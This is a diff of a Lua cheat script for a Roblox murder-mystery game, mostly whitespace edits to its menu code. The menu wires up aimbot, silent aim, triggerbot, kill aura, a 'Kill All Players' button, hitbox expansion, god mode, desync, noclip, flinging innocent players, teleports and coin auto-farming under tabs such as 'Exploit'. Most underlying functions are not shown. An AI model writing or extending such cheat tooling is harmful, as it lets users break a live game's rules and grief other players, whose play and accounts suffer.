     Default = true,
     Callback = function(v) State.ESP.NameTags = v; if State.ESP.Enabled then ForceRefreshESP() end end,
 })
-
 VisualsPlayerSection:AddSlider({
     Name = "Highlight Fill Transparency",
     Min = 0, Max = 1, Default = 0.84, Round = 2, Flag = "FillTransparency_Value",
@@ -3022,21 +3008,18 @@ VisualsPlayerSection:AddSlider({
 })
 
 local VisualsGunSection = VisualsTab:DrawSection({ Name = "Gun ESP", Position = 'left' })
-
 VisualsGunSection:AddToggle({
     Name = "Enable Tool Gun ESP",
     Flag = "GunESP_Enabled",
     Default = true,
     Callback = function(v) State.Gun.ESP = v; refreshToolGunESP() end
 })
-
 VisualsGunSection:AddToggle({
     Name = "Enable GunDrop Highlight",
     Flag = "GunDropHighlight_Enabled",
     Default = true,
     Callback = function(v) State.Gun.DropHighlight = v; highlightDroppedGun() end
 })
-
 VisualsGunSection:AddToggle({
     Name = "Gun Drop Line Tracer",
     Flag = "GunTracer_Enabled",
@@ -3046,12 +3029,11 @@ VisualsGunSection:AddToggle({
 
 local SheriffTab = Window:DrawTab({ Name = "Sheriff", Icon = "target", EnableScrolling = true })
 local SheriffCameraSection = SheriffTab:DrawSection({ Name = "Camera Aimbot (TORSO)", Position = 'left' })
-
 AimbotToggle = SheriffCameraSection:AddToggle({
     Name = "Enable Aimbot Feature",
     Flag = "Aimbot_Enabled",
     Default = false,
-    Callback = function(v) 
+    Callback = function(v)
         State.Aimbot.featureEnabled = v
         if not v then
             State.Aimbot.active = false
@@ -3062,33 +3044,28 @@ AimbotToggle = SheriffCameraSection:AddToggle({
         Notifier.new({Title="Aimbot", Content=v and "Enabled" or "Disabled", Duration=2})
     end,
 })
-
 SheriffCameraSection:AddToggle({
     Name = "Enable Sticky Aimlock",
     Flag = "Aimbot_Sticky",
     Default = false,
     Callback = function(v) State.Aimbot.Sticky = v; if not v then LockedTarget = nil end end
 })
-
 SheriffCameraSection:AddSlider({
     Name = "Smoothness",
     Min = 0.1, Max = 0.9, Default = 0.45, Round = 2, Flag = "Aimbot_Smooth",
     Callback = function(v) State.Aimbot.Smoothness = v end
 })
-
 SheriffCameraSection:AddSlider({
     Name = "Field of View",
     Min = 80, Max = 400, Default = 220, Round = 0, Flag = "Aimbot_FOV",
     Callback = function(v) State.Aimbot.FOV = v end
 })
-
 SheriffCameraSection:AddToggle({
     Name = "Target Murderer Only",
     Flag = "Aimbot_MurdererOnly",
     Default = false,
     Callback = function(v) State.Aimbot.OnlyMurderer = v end
 })
-
 SheriffCameraSection:AddKeybind({
     Name = "Aimbot Toggle Keybind",
     Default = "Q",
@@ -3097,7 +3074,6 @@ SheriffCameraSection:AddKeybind({
 })
 
 local SheriffFlickSection = SheriffTab:DrawSection({ Name = "Flick Shoot (TORSO)", Position = 'left' })
-
 SheriffFlickSection:AddToggle({
     Name = "Enable Flick Shoot",
     Flag = "FlickShoot_Enabled",
@@ -3107,14 +3083,12 @@ SheriffFlickSection:AddToggle({
         Notifier.new({Title="Flick Shoot", Content=v and "Enabled" or "Disabled", Duration=2})
     end,
 })
-
 SheriffFlickSection:AddToggle({
     Name = "Target Murderer Only",
     Flag = "FlickShoot_MurdererOnly",
     Default = true,
     Callback = function(v) State.FlickShoot.OnlyMurderer = v end
 })
-
 SheriffFlickSection:AddKeybind({
     Name = "Flick Shoot Keybind",
     Default = "E",
@@ -3123,14 +3097,12 @@ SheriffFlickSection:AddKeybind({
 })
 
 local SheriffSilentSection = SheriffTab:DrawSection({ Name = "Silent Aim (TORSO)", Position = 'left' })
-
 SheriffSilentSection:AddToggle({
     Name = "Enable Silent Aim",
     Flag = "SilentAim_Enabled",
     Default = false,
     Callback = function(v) silentAimEnabled = v; Notifier.new({Title="Silent Aim", Content=v and "Enabled - MASTER CONTROL" or "Disabled", Duration=2}) end,
 })
-
 SheriffSilentSection:AddToggle({
     Name = "Activate Only While Holding Shift",
     Flag = "AimOnlyHolding",
@@ -3139,7 +3111,6 @@ SheriffSilentSection:AddToggle({
 })
 
 local SheriffSilentHackerSection = SheriffTab:DrawSection({ Name = "(REQUIRES SILENT AIM)", Position = 'left' })
-
 local SilentHackerToggle = SheriffSilentHackerSection:AddToggle({
     Name = "Enable Silent Hacker",
     Flag = "SilentHacker_Enabled",
@@ -3154,13 +3125,11 @@ local SilentHackerToggle = SheriffSilentHackerSection:AddToggle({
         Notifier.new({Title="Silent Hacker", Content=v and "READY - SHOOT TO TELEPORT BEHIND + AUTO AIM" or "Disabled", Duration=3})
     end,
 })
-
 SheriffSilentHackerSection:AddSlider({
     Name = "Duration (seconds)",
     Min = 1, Max = 10, Default = 3, Round = 0, Flag = "SilentHacker_Duration",
     Callback = function(v) State.SilentHacker.Duration = v end
 })
-
 SheriffSilentHackerSection:AddSlider({
     Name = "Behind Distance (studs)",
     Min = 0.5, Max = 10, Default = 2, Round = 1, Flag = "SilentHacker_BehindDistance",
@@ -3168,12 +3137,11 @@ SheriffSilentHackerSection:AddSlider({
 })
 
 local SheriffTriggerSection = SheriffTab:DrawSection({ Name = "Triggerbot", Position = 'left' })
-
 SheriffTriggerSection:AddToggle({
     Name = "Enable Triggerbot",
     Flag = "Triggerbot_Enabled",
     Default = false,
-    Callback = function(v) 
+    Callback = function(v)
         State.Triggerbot.Enabled = v
         if v then startTriggerbot() elseif triggerConn then triggerConn:Disconnect() end
     end,
@@ -3181,25 +3149,21 @@ SheriffTriggerSection:AddToggle({
 
 local MurdererTab = Window:DrawTab({ Name = "Murderer", Icon = "sword", EnableScrolling = true })
 local MurdererRageSection = MurdererTab:DrawSection({ Name = "Rage Features", Position = 'left' })
-
 MurdererRageSection:AddToggle({
     Name = "Enable Kill Aura",
     Flag = "KillAura_Enabled",
     Default = false,
     Callback = function(v) State.KillAura.Enabled = v; Notifier.new({Title="Kill Aura", Content=v and "Enabled" or "Disabled", Duration=2}) end,
 })
-
 MurdererRageSection:AddSlider({
     Name = "Kill Aura Range",
     Min = 5, Max = 250, Default = 25, Round = 0, Flag = "KillAura_Range",
     Callback = function(v) State.KillAura.Range = v end
 })
-
 MurdererRageSection:AddButton({
     Name = "Kill All Players",
     Callback = PerformKillAll,
 })
-
 MurdererRageSection:AddKeybind({
     Name = "Kill All Keybind",
     Default = "K",
@@ -3208,7 +3172,6 @@ MurdererRageSection:AddKeybind({
 })
 
 local MurdererHitboxSection = MurdererTab:DrawSection({ Name = "Hitbox Expander", Position = 'left' })
-
 MurdererHitboxSection:AddToggle({
     Name = "Enable Hitbox Expander",
     Flag = "Hitbox_Enabled",
@@ -3227,20 +3190,17 @@ MurdererHitboxSection:AddToggle({
         end
     end,
 })
-
 MurdererHitboxSection:AddToggle({
     Name = "Visualize Hitboxes",
     Flag = "VisualizeHitbox",
     Default = false,
     Callback = function(v) State.Hitbox.Visualize = v; UpdateAllHitboxes() end,
 })
-
 MurdererHitboxSection:AddSlider({
     Name = "Hitbox Size",
     Min = 5, Max = 50, Default = 10, Round = 0, Flag = "Hitbox_Size",
     Callback = function(v) State.Hitbox.Size = v; if State.Hitbox.Enabled then UpdateAllHitboxes() end end
 })
-
 MurdererHitboxSection:AddKeybind({
     Name = "Visualizer Keybind",
     Default = "U",
@@ -3249,24 +3209,21 @@ MurdererHitboxSection:AddKeybind({
 })
 
 local MovementTab = Window:DrawTab({ Name = "Movement", Icon = "user", EnableScrolling = true })
-
 local MovementWalkSpeedSection = MovementTab:DrawSection({ Name = "WalkSpeed", Position = 'left' })
-
 MovementWalkSpeedSection:AddToggle({
     Name = "Enable WalkSpeed",
     Flag = "WalkSpeed_Enabled",
     Default = false,
-    Callback = function(v) 
+    Callback = function(v)
         State.WalkSpeed.Enabled = v
         applyWalkSpeed()
         Notifier.new({Title="WalkSpeed", Content=v and "Enabled: "..State.WalkSpeed.Speed or "Disabled", Duration=2})
     end,
 })
-
 MovementWalkSpeedSection:AddSlider({
     Name = "WalkSpeed Amount",
     Min = 16, Max = 250, Default = 50, Round = 0, Flag = "WalkSpeed_Amount",
-    Callback = function(v) 
+    Callback = function(v)
         State.WalkSpeed.Speed = v
         if State.WalkSpeed.Enabled then applyWalkSpeed() end
         Notifier.new({Title="WalkSpeed", Content="Set to "..v, Duration=1.5})
@@ -3274,12 +3231,11 @@ MovementWalkSpeedSection:AddSlider({
 })
 
 local MovementInfiniteJumpSection = MovementTab:DrawSection({ Name = "Infinite Jump", Position = 'left' })
-
 MovementInfiniteJumpSection:AddToggle({
     Name = "Enable Infinite Jump",
     Flag = "InfiniteJump_Enabled",
     Default = false,
-    Callback = function(v) 
+    Callback = function(v)
         State.InfiniteJump.Enabled = v
         if v then
             setupInfiniteJump()
@@ -3290,24 +3246,21 @@ MovementInfiniteJumpSection:AddToggle({
         end
     end,
 })
-
 MovementInfiniteJumpSection:AddParagraph({
     title = "How to use:",
     text = "Simply press SPACE repeatedly to jump infinitely! Works mid-air.",
 })
 
 local MovementSpeedSection = MovementTab:DrawSection({ Name = "Speed Boost (Hold Shift)", Position = 'left' })
-
 MovementSpeedSection:AddToggle({
     Name = "Enable Speed Boost",
     Flag = "SpeedBoost_Enabled",
     Default = false,
-    Callback = function(v) 
+    Callback = function(v)
         State.SpeedBoost.Enabled = v
         Notifier.new({Title="Speed Boost", Content=v and "Enabled" or "Disabled", Duration=2})
     end,
 })
-
 MovementSpeedSection:AddSlider({
     Name = "Speed Boost Amount",
     Min = 16, Max = 100, Default = 19, Round = 0, Flag = "SpeedBoost_Amount",
@@ -3315,12 +3268,11 @@ MovementSpeedSection:AddSlider({
 })
 
 local MovementAntiFlingSection = MovementTab:DrawSection({ Name = "Anti-Fling", Position = 'left' })
-
 MovementAntiFlingSection:AddToggle({
     Name = "Enable Anti-Fling",
     Flag = "AntiFling_Enabled",
     Default = false,
-    Callback = function(v) 
+    Callback = function(v)
         State.AntiFling.Enabled = v
         if v then
             setupAntiFling()
@@ -3332,7 +3284,6 @@ MovementAntiFlingSection:AddToggle({
 })
 
 local MovementNoclipSection = MovementTab:DrawSection({ Name = "Noclip", Position = 'left' })
-
 MovementNoclipSection:AddToggle({
     Name = "Enable Noclip",
     Flag = "Noclip_Enabled",
@@ -3352,7 +3303,6 @@ MovementNoclipSection:AddToggle({
 
 local FPSBoosterTab = Window:DrawTab({ Name = "FPS Booster", Icon = "cpu", EnableScrolling = true })
 local FPSBoosterSection = FPSBoosterTab:DrawSection({ Name = "Performance Settings", Position = 'left' })
-
 FPSBoosterSection:AddToggle({
     Name = "Enable FPS Booster",
     Flag = "FPSBooster_Enabled",
@@ -3362,12 +3312,10 @@ FPSBoosterSection:AddToggle({
         Notifier.new({Title="FPS Booster", Content=v and "ENABLED - Effects disabled, FullBright ON" or "DISABLED - Graphics restored", Duration=3})
     end,
 })
-
 FPSBoosterSection:AddParagraph({
     title = "What this does:",
     text = "- Disables all Textures (Decals/Textures)\n- Disables Visual Effects (Bloom/Blur)\n- Optimizes Parts (SmoothPlastic material)\n- Disables Particles (Smoke/Fire/Emitters)\n- Removes Skybox\n- Enables FullBright\n- Monitor for new assets and applies automatically",
 })
-
 FPSBoosterSection:AddButton({
     Name = "Reapply FPS Booster",
     Callback = function()
@@ -3382,19 +3330,17 @@ FPSBoosterSection:AddButton({
 
 local ExploitTab = Window:DrawTab({ Name = "Exploit", Icon = "skull", EnableScrolling = true })
 local ExploitSurvivalSection = ExploitTab:DrawSection({ Name = "Survival Features", Position = 'left' })
-
 ExploitSurvivalSection:AddToggle({
     Name = "Enable God Mode",
     Flag = "GodMode_Enabled",
     Default = false,
     Risky = true,
-    Callback = function(v) 
+    Callback = function(v)
         State.GodMode.Enabled = v
         if v then enableGodMode() end
         Notifier.new({Title="God Mode", Content=v and "ON" or "OFF", Duration=2})
     end,
 })
-
 ExploitSurvivalSection:AddKeybind({
     Name = "God Mode Keybind",
     Default = "G",
@@ -3403,12 +3349,11 @@ ExploitSurvivalSection:AddKeybind({
 })
 
 local ExploitDesyncSection = ExploitTab:DrawSection({ Name = "Desync", Position = 'left' })
-
 DesyncToggle = ExploitDesyncSection:AddToggle({
     Name = "Enable Desync Feature",
     Flag = "Desync_Enabled",
     Default = false,
-    Callback = function(v) 
+    Callback = function(v)
         State.Desync.featureEnabled = v
         if not v then
             State.Desync.active = false
@@ -3418,14 +3363,12 @@ DesyncToggle = ExploitDesyncSection:AddToggle({
         SetDesyncToggle(State.Desync.active)
     end,
 })
-
 ExploitDesyncSection:AddKeybind({
     Name = "Desync Toggle Keybind",
     Default = "Z",
     Flag = "Desync_Keybind",
     Callback = function(v) State.Desync.Keybind = v end,
 })
-
 ExploitDesyncSection:AddDropdown({
     Name = "Desync Method",
     Default = "Sky",
@@ -3433,7 +3376,6 @@ ExploitDesyncSection:AddDropdown({
     Values = {"Void","Sky","Underground","Random","Oscillate","Spin"},
     Callback = function(v) getgenv().Desync.Method = v end
 })
-
 ExploitDesyncSection:AddToggle({
     Name = "Return to Original Position",
     Flag = "Desync_Return",
@@ -3442,20 +3384,17 @@ ExploitDesyncSection:AddToggle({
 })
 
 local ExploitAutoDesyncSection = ExploitTab:DrawSection({ Name = "Auto Desync on Damage", Position = 'left' })
-
 ExploitAutoDesyncSection:AddToggle({
     Name = "Enable Auto Desync on Damage",
     Flag = "AutoDesync_Damage",
     Default = false,
     Callback = function(v) getgenv().Desync.AutoDesyncOnDamage = v end,
 })
-
 ExploitAutoDesyncSection:AddSlider({
     Name = "Health Threshold (%)",
     Min = 1, Max = 100, Default = 90, Round = 0, Flag = "Health_Threshold",
     Callback = function(v) getgenv().Desync.HealthThreshold = v end,
 })
-
 ExploitAutoDesyncSection:AddSlider({
     Name = "Cooldown (seconds)",
     Min = 0.1, Max = 5, Default = 1, Round = 1, Flag = "Desync_Cooldown",
@@ -3463,25 +3402,21 @@ ExploitAutoDesyncSection:AddSlider({
 })
 
 local ExploitMethodSettingsSection = ExploitTab:DrawSection({ Name = "Method Settings", Position = 'left' })
-
 ExploitMethodSettingsSection:AddSlider({
     Name = "Random Distance",
     Min = 10, Max = 500, Default = 100, Round = 0, Flag = "Random_Distance",
     Callback = function(v) getgenv().Desync.RandomDistance = v end
 })
-
 ExploitMethodSettingsSection:AddSlider({
     Name = "Oscillate Distance",
     Min = 10, Max = 200, Default = 50, Round = 0, Flag = "Oscillate_Distance",
     Callback = function(v) getgenv().Desync.OscillateDistance = v end
 })
-
 ExploitMethodSettingsSection:AddSlider({
     Name = "Oscillate Speed",
     Min = 1, Max = 20, Default = 5, Round = 1, Flag = "Oscillate_Speed",
     Callback = function(v) getgenv().Desync.OscillateSpeed = v end
 })
-
 ExploitMethodSettingsSection:AddSlider({
     Name = "Spin Speed",
     Min = 5, Max = 100, Default = 20, Round = 0, Flag = "Spin_Speed",
@@ -3489,7 +3424,6 @@ ExploitMethodSettingsSection:AddSlider({
 })
 
 local ExploitAutoAvoidSection = ExploitTab:DrawSection({ Name = "Auto Avoid Murderer", Position = 'left' })
-
 ExploitAutoAvoidSection:AddToggle({
     Name = "Enable Auto Avoid Murderer",
     Flag = "AutoAvoid_Murderer",
@@ -3499,7 +3433,6 @@ ExploitAutoAvoidSection:AddToggle({
         Notifier.new({Title="Auto Avoid", Content=v and "Enabled" or "Disabled", Duration=2})
     end,
 })
-
 ExploitAutoAvoidSection:AddSlider({
     Name = "Avoid Distance (studs)",
     Min = 5, Max = 50, Default = 20, Round = 0, Flag = "Avoid_Distance",
@@ -3508,16 +3441,13 @@ ExploitAutoAvoidSection:AddSlider({
 
 local PlayersTab = Window:DrawTab({ Name = "Players", Icon = "contact", EnableScrolling = true })
 local PlayersTeleportsSection = PlayersTab:DrawSection({ Name = "Teleports", Position = 'left' })
-
 PlayersTeleportsSection:AddButton({ Name = "Teleport to Lobby", Callback = tpLobby })
 PlayersTeleportsSection:AddButton({ Name = "Teleport to Current Map", Callback = tpMap })
 PlayersTeleportsSection:AddButton({ Name = "Emergency Teleport", Callback = tpEmergency })
 PlayersTeleportsSection:AddButton({ Name = "Respawn", Callback = respawn })
 
 local PlayersGunTPSection = PlayersTab:DrawSection({ Name = "GUN TELEPORTER", Position = 'left' })
-
 PlayersGunTPSection:AddButton({ Name = "Teleport to Gun (Snap Back)", Callback = TeleportToGunSnapBack })
-
 PlayersGunTPSection:AddToggle({
     Name = "Enable Auto Teleport to Gun",
     Flag = "AutoGunTP_Enabled",
@@ -3527,7 +3457,6 @@ PlayersGunTPSection:AddToggle({
 
 local SelectedPlayerName = nil
 local PlayersSelectorSection = PlayersTab:DrawSection({ Name = "Player Selector", Position = 'left' })
-
 local PlayerDropdown = PlayersSelectorSection:AddDropdown({
     Name = "Select Player",
     Default = "",
@@ -3589,7 +3518,7 @@ local function FlingInnocents()
         return
     end
     Notifier.new({Title="Fling Innocents", Content="Found "..#innocents.." Innocent players", Duration=2})
-    
+   
     local function flingNext(index)
         if index > #innocents then
             Notifier.new({Title="Fling Innocents", Content="Finished flinging all Innocents", Duration=3})
@@ -3651,7 +3580,6 @@ PlayersActionsSection:AddToggle({
 
 local AutoFarmTab = Window:DrawTab({ Name = "Auto Farm", Icon = "dollar-sign", EnableScrolling = true })
 local AutoFarmSection = AutoFarmTab:DrawSection({ Name = "Coin Collector", Position = 'left' })
-
 AutoFarmSection:AddToggle({
     Name = "Enable Auto Farm",
     Flag = "AutoFarm_Enabled",
@@ -3660,7 +3588,6 @@ AutoFarmSection:AddToggle({
         toggleAutoFarm()
     end,
 })
-
 AutoFarmSection:AddToggle({
     Name = "Show Coin ESP",
     Flag = "AutoFarm_ESP",
@@ -3669,7 +3596,6 @@ AutoFarmSection:AddToggle({
         toggleAutoFarmESP()
     end,
 })
-
 AutoFarmSection:AddDropdown({
     Name = "Collection Mode",
     Flag = "AutoFarm_Mode",
@@ -3679,7 +3605,6 @@ AutoFarmSection:AddDropdown({
         setAutoFarmMode(v)
     end,
 })
-
 AutoFarmSection:AddSlider({
     Name = "Tween Speed (1 = Fast, 100 = Slow)",
     Min = 1,
@@ -3692,7 +3617,6 @@ AutoFarmSection:AddSlider({
         Notifier.new({Title="Tween Speed", Content=string.format("%.1f seconds per coin", speedSeconds), Duration=2})
     end,
 })
-
 AutoFarmSection:AddParagraph({
     title = "Auto Farm Info",
     text = "Automatically collects all coins",
@@ -3701,27 +3625,22 @@ AutoFarmSection:AddParagraph({
 Window:DrawCategory({ Name = "Settings" })
 local SettingsTab = Window:DrawTab({ Name = "Settings", Icon = "settings", EnableScrolling = true })
 local UISettingsSection = SettingsTab:DrawSection({ Name = "UI Settings", Position = 'left' })
-
 UISettingsSection:AddToggle({ Name = "Always Show Frame", Default = false, Callback = function(v) Window.AlwayShowTab = v end })
-
 UISettingsSection:AddColorPicker({
     Name = "Highlight Color",
     Default = Compkiller.Colors.Highlight,
     Callback = function(v) Compkiller.Colors.Highlight = v; Compkiller:RefreshCurrentColor() end
 })
-
 UISettingsSection:AddColorPicker({
     Name = "Toggle Color",
     Default = Compkiller.Colors.Toggle,
     Callback = function(v) Compkiller.Colors.Toggle = v; Compkiller:RefreshCurrentColor() end
 })
-
 UISettingsSection:AddColorPicker({
     Name = "Background Color",
     Default = Compkiller.Colors.BGDBColor,
     Callback = function(v) Compkiller.Colors.BGDBColor = v; Compkiller:RefreshCurrentColor() end
 })
-
 UISettingsSection:AddButton({
     Name = "Get Theme",
     Callback = function()
@@ -3739,7 +3658,6 @@ ThemeSection:AddDropdown({
 
 local ConfigUI = Window:DrawConfig({ Name = "Config", Icon = "folder", Config = ConfigManager })
 ConfigUI:Init()
-
 ConfigManager:LoadConfig("AnnieConfig")
 
 task.spawn(function()
